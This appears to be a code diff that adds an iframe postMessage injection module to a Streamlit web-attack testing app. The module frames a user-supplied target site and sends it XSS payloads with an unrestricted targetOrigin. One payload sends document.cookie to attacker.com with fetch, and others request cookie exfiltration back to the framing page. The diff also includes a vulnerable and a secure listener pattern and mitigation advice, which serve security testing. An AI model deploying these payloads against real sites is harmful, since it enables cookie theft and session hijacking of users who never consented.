@@ -72,6 +72,29 @@ with st.sidebar:
     
     st.divider()
     
+    st.subheader("Iframe postMessage Injection")
+    enable_iframe_injection = st.toggle(
+        "Enable iframe postMessage injection test",
+        value=False,
+        help="Test if iframe accepts and processes postMessage from parent without origin validation"
+    )
+    
+    iframe_target_url = st.text_input(
+        "Iframe target URL",
+        value="https://target-app.com",
+        placeholder="https://target-app.com",
+        help="Site to embed in iframe and test for postMessage vulnerabilities"
+    )
+    
+    iframe_injection_payload = st.text_area(
+        "Injection payload",
+        value='{"type":"xss_test","payload":"<img src=x onerror=alert(1)>"}',
+        height=80,
+        help="Payload to send to iframe via postMessage"
+    )
+    
+    st.divider()
+    
     with st.expander("🔧 Troubleshooting Guide"):
         st.markdown("""
         **Common Issues:**
@@ -160,6 +183,12 @@ with st.expander("🔍 Validation Tests", expanded=True):
     - ✓ **Data Relay via postMessage**: Monitors proxied WebSocket data
     - ✓ **Command Injection**: Tests if attacker can send commands through popup
     - ✓ **Session Hijacking**: Validates complete session takeover scenario
+    
+    **Iframe postMessage Injection:**
+    - ✓ **Reverse postMessage Attack**: Tests parent → iframe message injection
+    - ✓ **Origin Validation**: Checks if iframe validates message sender
+    - ✓ **DOM-based XSS**: Tests if malicious payload executes in iframe
+    - ✓ **Cookie Exfiltration**: Monitors if iframe sends back sensitive data
     
     **How to Test:**
     1. Set your target URL, popup URL, and WebSocket URL in the sidebar
@@ -1164,3 +1193,386 @@ elif enable_ws_relay:
     st.warning("Enter a valid popup URL (http:// or https://) to test WebSocket relay attack.")
 else:
     st.info("💡 Enable 'WebSocket relay via popup' in the sidebar to test this advanced attack vector.")
+
+st.divider()
+st.subheader("Iframe postMessage Injection Attack")
+st.caption("Test if iframe accepts and processes postMessage without origin validation")
+
+with st.expander("🎯 About Iframe postMessage Injection", expanded=False):
+    st.markdown("""
+    **Iframe postMessage Injection** exploits missing origin validation in the target site's message listener.
+    
+    **Attack Flow:**
+    1. Attacker embeds victim site in an iframe on attacker-controlled domain
+    2. Victim site has `window.addEventListener('message', ...)` without origin validation
+    3. Attacker sends malicious payload via `iframe.contentWindow.postMessage()`
+    4. Victim site processes the message without checking `event.origin`
+    5. If payload contains XSS, it executes in victim's context
+    6. XSS can read `document.cookie` (if not HttpOnly)
+    7. Cookie data sent back to attacker via postMessage
+    
+    **Why It's Dangerous:**
+    - **Bypasses Same-Origin Policy**: Attacker controls the framing page
+    - **Origin validation missing**: Target doesn't verify message sender
+    - **DOM-based XSS**: Unsafe message processing leads to code execution
+    - **Cookie theft**: Non-HttpOnly cookies can be exfiltrated
+    - **Invisible attack**: User doesn't see anything suspicious
+    
+    **Vulnerable Pattern:**
+    ```javascript
+    // VULNERABLE CODE (in target site)
+    window.addEventListener('message', (event) => {
+      // ❌ No origin validation!
+      document.getElementById('content').innerHTML = event.data.html;
+      // DOM-based XSS if data.html contains malicious code
+    });
+    ```
+    
+    **Secure Pattern:**
+    ```javascript
+    // SECURE CODE
+    window.addEventListener('message', (event) => {
+      // ✓ Validate origin
+      if (event.origin !== 'https://trusted-domain.com') return;
+      
+      // ✓ Sanitize data
+      const sanitized = DOMPurify.sanitize(event.data.html);
+      document.getElementById('content').innerHTML = sanitized;
+    });
+    ```
+    
+    **Real-World Targets:**
+    - Sites with iframe integration (payment processors, OAuth flows)
+    - Dashboard widgets expecting external configuration
+    - Embeddable chat/support widgets
+    - Sites with cross-domain communication features
+    """)
+
+if enable_iframe_injection and iframe_target_url.startswith(("http://", "https://")):
+    iframe_url_js = json.dumps(iframe_target_url)
+    injection_payload_js = json.dumps(iframe_injection_payload)
+    
+    components.html(
+        f"""
+        <div style="font-family: sans-serif;">
+          <div style="margin-bottom:1rem;padding:0.8rem;background:#fff3e0;border-left:4px solid #ff9800;">
+            <strong>🎯 Iframe Injection Status:</strong>
+            <div style="margin-top:0.5rem;">
+              <span id="inj-iframe-status" style="margin-right:1rem;">⚪ Iframe: Not loaded</span>
+              <span id="inj-msg-sent" style="margin-right:1rem;">📤 Sent: 0</span>
+              <span id="inj-msg-received" style="margin-right:1rem;">📥 Received: 0</span>
+            </div>
+          </div>
+          
+          <div style="display:flex;gap:0.5rem;flex-wrap:wrap;margin-bottom:1rem;">
+            <button id="inj-load-iframe" style="padding:0.5rem 0.8rem;cursor:pointer;background:#1976d2;color:white;border:none;border-radius:4px;">Load Target Iframe</button>
+            <button id="inj-send-payload" style="padding:0.5rem 0.8rem;cursor:pointer;background:#f57c00;color:white;border:none;border-radius:4px;">Inject Payload</button>
+            <button id="inj-send-xss" style="padding:0.5rem 0.8rem;cursor:pointer;background:#d32f2f;color:white;border:none;border-radius:4px;">Send XSS Test</button>
+            <button id="inj-send-exfil" style="padding:0.5rem 0.8rem;cursor:pointer;background:#9c27b0;color:white;border:none;border-radius:4px;">Request Cookie Exfil</button>
+            <button id="inj-validate" style="padding:0.5rem 0.8rem;cursor:pointer;background:#388e3c;color:white;border:none;border-radius:4px;">Run Validation</button>
+            <button id="inj-clear" style="padding:0.5rem 0.8rem;cursor:pointer;background:#757575;color:white;border:none;border-radius:4px;">Clear Log</button>
+          </div>
+          
+          <div id="inj-info" style="margin-bottom:0.6rem;padding:0.5rem;background:#e3f2fd;border:1px solid #2196f3;border-radius:4px;color:#0d47a1;">Ready to test iframe postMessage injection</div>
+          
+          <div id="iframe-container" style="margin-bottom:0.6rem;border:2px dashed #ccc;border-radius:4px;min-height:200px;display:flex;align-items:center;justify-content:center;background:#fafafa;">
+            <span style="color:#999;">Iframe will load here after clicking "Load Target Iframe"</span>
+          </div>
+          
+          <pre id="inj-log" style="padding:0.6rem;background:#f7f7f7;border:1px solid #ddd;border-radius:4px;max-height:300px;overflow:auto;font-size:0.85rem;"></pre>
+        </div>
+
+        <script>
+          const injInfo = document.getElementById("inj-info");
+          const injLog = document.getElementById("inj-log");
+          const injLoadBtn = document.getElementById("inj-load-iframe");
+          const injSendPayloadBtn = document.getElementById("inj-send-payload");
+          const injSendXssBtn = document.getElementById("inj-send-xss");
+          const injSendExfilBtn = document.getElementById("inj-send-exfil");
+          const injValidateBtn = document.getElementById("inj-validate");
+          const injClearBtn = document.getElementById("inj-clear");
+          const injIframeStatusEl = document.getElementById("inj-iframe-status");
+          const injMsgSentEl = document.getElementById("inj-msg-sent");
+          const injMsgReceivedEl = document.getElementById("inj-msg-received");
+          const iframeContainer = document.getElementById("iframe-container");
+
+          const targetUrl = {iframe_url_js};
+          const injectionPayload = {injection_payload_js};
+
+          let targetIframe = null;
+          let messagesSent = 0;
+          let messagesReceived = 0;
+          let iframeLoaded = false;
+          let exfilDetected = false;
+
+          function injAppend(line, type = "info") {{
+            const timestamp = new Date().toLocaleTimeString();
+            const prefix = type === "success" ? "✓" : type === "error" ? "✗" : type === "warning" ? "⚠" : type === "vuln" ? "🔴" : type === "exfil" ? "💀" : "ℹ";
+            injLog.textContent += `[${{timestamp}}] ${{prefix}} ${{line}}\\n`;
+            injLog.scrollTop = injLog.scrollHeight;
+          }}
+
+          function injUpdateInfo(msg, type = "info") {{
+            injInfo.textContent = msg;
+            injInfo.style.background = type === "success" ? "#d4edda" : type === "error" ? "#f8d7da" : type === "warning" ? "#fff3cd" : type === "vuln" ? "#ffebee" : type === "exfil" ? "#fce4ec" : "#e3f2fd";
+            injInfo.style.borderColor = type === "success" ? "#c3e6cb" : type === "error" ? "#f5c6cb" : type === "warning" ? "#ffc107" : type === "vuln" ? "#f44336" : type === "exfil" ? "#e91e63" : "#2196f3";
+            injInfo.style.color = type === "success" ? "#155724" : type === "error" ? "#721c24" : type === "warning" ? "#856404" : type === "vuln" ? "#b71c1c" : type === "exfil" ? "#880e4f" : "#0d47a1";
+          }}
+
+          function updateIframeStatus() {{
+            if (iframeLoaded) {{
+              injIframeStatusEl.textContent = "🟢 Iframe: Loaded";
+              injIframeStatusEl.style.color = "#2e7d32";
+            }} else {{
+              injIframeStatusEl.textContent = "🔴 Iframe: Not loaded";
+              injIframeStatusEl.style.color = "#c62828";
+            }}
+          }}
+
+          function updateMsgCounters() {{
+            injMsgSentEl.textContent = `📤 Sent: ${{messagesSent}}`;
+            injMsgReceivedEl.textContent = `📥 Received: ${{messagesReceived}}`;
+            if (messagesReceived > 0) {{
+              injMsgReceivedEl.style.color = "#d32f2f";
+            }}
+          }}
+
+          // Listen for messages FROM the iframe (exfiltration attempts)
+          window.addEventListener("message", (event) => {{
+            messagesReceived++;
+            updateMsgCounters();
+            
+            injAppend("\\n📥 RECEIVED MESSAGE FROM IFRAME:", "exfil");
+            injAppend(`   Origin: ${{event.origin}}`, "vuln");
+            injAppend(`   Data: ${{JSON.stringify(event.data)}}`, "vuln");
+            
+            // Check for cookie exfiltration
+            if (event.data && (event.data.cookies || event.data.type === "exfil" || event.data.type === "cookie_data")) {{
+              exfilDetected = true;
+              injAppend("   💀 COOKIE EXFILTRATION DETECTED!", "exfil");
+              injAppend("   Target site sent back sensitive data", "vuln");
+              injUpdateInfo("⚠️ Cookie Exfiltration Detected!", "exfil");
+            }}
+            
+            // Check if this is a response to our injection
+            if (event.origin === new URL(targetUrl).origin) {{
+              injAppend("   🔴 VULNERABLE: Iframe is responding to our messages", "vuln");
+              injAppend("   This indicates lack of origin validation", "vuln");
+            }}
+          }});
+
+          injLoadBtn.addEventListener("click", () => {{
+            if (targetIframe) {{
+              injAppend("Iframe already loaded", "warning");
+              return;
+            }}
+
+            injAppend("\\n=== Loading Target Iframe ===");
+            injAppend(`Target URL: ${{targetUrl}}`);
+            injAppend(`Attacker origin: ${{window.location.origin}}`);
+
+            try {{
+              targetIframe = document.createElement("iframe");
+              targetIframe.src = targetUrl;
+              targetIframe.style.width = "100%";
+              targetIframe.style.height = "200px";
+              targetIframe.style.border = "1px solid #ddd";
+              targetIframe.style.borderRadius = "4px";
+
+              targetIframe.onload = () => {{
+                iframeLoaded = true;
+                updateIframeStatus();
+                injAppend("✓ Iframe loaded successfully", "success");
+                injAppend("💀 Target site is now framed on attacker's domain", "vuln");
+                injAppend("   Ready to inject postMessage payloads", "warning");
+                injUpdateInfo("Iframe loaded - Ready to inject", "warning");
+              }};
+
+              targetIframe.onerror = () => {{
+                injAppend("✗ Iframe failed to load", "error");
+                injAppend("   Possible X-Frame-Options or CSP protection", "info");
+              }};
+
+              iframeContainer.innerHTML = "";
+              iframeContainer.appendChild(targetIframe);
+
+            }} catch (e) {{
+              injAppend(`Error: ${{e.message}}`, "error");
+            }}
+          }});
+
+          injSendPayloadBtn.addEventListener("click", () => {{
+            if (!targetIframe || !iframeLoaded) {{
+              injAppend("Iframe not loaded. Click 'Load Target Iframe' first.", "error");
+              return;
+            }}
+
+            injAppend("\\n=== Injecting Custom Payload ===");
+            
+            try {{
+              let payload;
+              try {{
+                payload = JSON.parse(injectionPayload);
+              }} catch {{
+                payload = injectionPayload;
+              }}
+
+              injAppend(`Payload: ${{JSON.stringify(payload)}}`);
+              injAppend("Sending to iframe with targetOrigin='*' (no validation)");
+
+              targetIframe.contentWindow.postMessage(payload, "*");
+              messagesSent++;
+              updateMsgCounters();
+
+              injAppend("✓ Payload sent to iframe", "success");
+              injAppend("⚠ If iframe processes without origin check → VULNERABLE", "warning");
+              injUpdateInfo("Payload injected - Monitoring for response", "warning");
+
+            }} catch (e) {{
+              injAppend(`Error: ${{e.message}}`, "error");
+            }}
+          }});
+
+          injSendXssBtn.addEventListener("click", () => {{
+            if (!targetIframe || !iframeLoaded) {{
+              injAppend("Iframe not loaded. Click 'Load Target Iframe' first.", "error");
+              return;
+            }}
+
+            injAppend("\\n=== Sending XSS Test Payload ===");
+
+            const xssPayloads = [
+              {{ type: "html", content: "<img src=x onerror='alert(1)'>" }},
+              {{ type: "script", content: "<script>alert(document.domain)</script>" }},
+              {{ type: "event", content: "<div onload='alert(1)'>test</div>" }},
+              {{ innerHTML: "<img src=x onerror='fetch(\\"https://attacker.com?c=\\"+document.cookie)'>" }}
+            ];
+
+            xssPayloads.forEach((payload, index) => {{
+              injAppend(`Test ${{index + 1}}: ${{JSON.stringify(payload)}}`);
+              targetIframe.contentWindow.postMessage(payload, "*");
+              messagesSent++;
+            }});
+
+            updateMsgCounters();
+            injAppend("✓ XSS test payloads sent", "success");
+            injAppend("🔴 If any execute → DOM-based XSS vulnerability", "vuln");
+            injUpdateInfo("XSS payloads sent - Check iframe for execution", "warning");
+          }});
+
+          injSendExfilBtn.addEventListener("click", () => {{
+            if (!targetIframe || !iframeLoaded) {{
+              injAppend("Iframe not loaded. Click 'Load Target Iframe' first.", "error");
+              return;
+            }}
+
+            injAppend("\\n=== Requesting Cookie Exfiltration ===");
+
+            const exfilPayloads = [
+              {{ type: "get_cookies", target: "parent" }},
+              {{ action: "execute", code: "window.parent.postMessage({{type:'exfil',cookies:document.cookie}},'*')" }},
+              {{ eval: "document.cookie" }},
+              {{ innerHTML: "<img src=x onerror='parent.postMessage({{cookies:document.cookie}},\\"*\\")'>" }}
+            ];
+
+            exfilPayloads.forEach((payload, index) => {{
+              injAppend(`Exfil attempt ${{index + 1}}: ${{JSON.stringify(payload)}}`);
+              targetIframe.contentWindow.postMessage(payload, "*");
+              messagesSent++;
+            }});
+
+            updateMsgCounters();
+            injAppend("✓ Cookie exfiltration requests sent", "success");
+            injAppend("💀 Waiting for iframe to send back cookies...", "exfil");
+            injUpdateInfo("Exfiltration requested - Monitoring responses", "warning");
+          }});
+
+          injValidateBtn.addEventListener("click", () => {{
+            injAppend("\\n=== Running Iframe Injection Validation ===");
+
+            // Test 1: Iframe framing
+            injAppend("Test 1: Iframe Framing");
+            if (iframeLoaded) {{
+              injAppend("  🔴 VULNERABLE: Site can be framed", "vuln");
+              injAppend("  No X-Frame-Options or CSP frame-ancestors", "vuln");
+            }} else {{
+              injAppend("  ✓ Site cannot be framed (protected)", "success");
+            }}
+
+            // Test 2: Message injection
+            injAppend("\\nTest 2: postMessage Injection");
+            injAppend(`  Messages sent to iframe: ${{messagesSent}}`);
+            if (messagesSent > 0 && iframeLoaded) {{
+              injAppend("  ⚠ Messages were delivered to iframe", "warning");
+              injAppend("  If processed → origin validation missing", "warning");
+            }}
+
+            // Test 3: Iframe responses
+            injAppend("\\nTest 3: Iframe Response Detection");
+            injAppend(`  Messages received from iframe: ${{messagesReceived}}`);
+            if (messagesReceived > 0) {{
+              injAppend("  🔴 VULNERABLE: Iframe is responding", "vuln");
+              injAppend("  Target lacks origin validation", "vuln");
+            }} else {{
+              injAppend("  ✓ No responses (may have origin validation)", "success");
+            }}
+
+            // Test 4: Cookie exfiltration
+            injAppend("\\nTest 4: Cookie Exfiltration");
+            if (exfilDetected) {{
+              injAppend("  💀 CRITICAL: Cookie exfiltration successful!", "exfil");
+              injAppend("  Attacker received sensitive data from iframe", "vuln");
+            }} else {{
+              injAppend("  ℹ No exfiltration detected", "info");
+            }}
+
+            // Summary
+            injAppend("\\n=== Attack Assessment ===");
+            if (iframeLoaded && messagesReceived > 0) {{
+              injAppend("🔴 VULNERABLE TO IFRAME POSTMESSAGE INJECTION", "vuln");
+              injAppend("\\nMitigation Required:");
+              injAppend("  • Validate event.origin in message listeners");
+              injAppend("  • Set X-Frame-Options: DENY or SAMEORIGIN");
+              injAppend("  • Use CSP frame-ancestors directive");
+              injAppend("  • Sanitize all postMessage data");
+              injAppend("  • Set HttpOnly flag on sensitive cookies");
+            }} else if (iframeLoaded) {{
+              injAppend("⚠ Site can be framed but no responses detected", "warning");
+              injAppend("   May have origin validation (good)");
+              injAppend("   But framing should still be prevented");
+            }} else {{
+              injAppend("✓ Site appears protected from framing", "success");
+            }}
+
+            injAppend("=== Validation Complete ===\\n");
+          }});
+
+          injClearBtn.addEventListener("click", () => {{
+            injLog.textContent = "";
+            injUpdateInfo("Log cleared", "info");
+          }});
+
+          // Initial message
+          setTimeout(() => {{
+            injAppend("Iframe postMessage injection tester initialized");
+            injAppend("\\nThis tests for:");
+            injAppend("  • Missing origin validation in message listeners");
+            injAppend("  • DOM-based XSS via unsafe postMessage handling");
+            injAppend("  • Cookie exfiltration vulnerabilities");
+            injAppend("  • Frame protection (X-Frame-Options, CSP)");
+            injAppend("\\nSteps:");
+            injAppend("  1. Click 'Load Target Iframe' to frame the target site");
+            injAppend("  2. Use 'Inject Payload' to send custom message");
+            injAppend("  3. Try 'Send XSS Test' to check for DOM-XSS");
+            injAppend("  4. Use 'Request Cookie Exfil' to test data theft");
+            injAppend("  5. Click 'Run Validation' for complete assessment\\n");
+            updateIframeStatus();
+          }}, 500);
+        </script>
+        """,
+        height=750,
+    )
+elif enable_iframe_injection:
+    st.warning("Enter a valid iframe target URL (http:// or https://) to test iframe postMessage injection.")
+else:
+    st.info("💡 Enable 'Iframe postMessage injection test' in the sidebar to test this attack vector.")
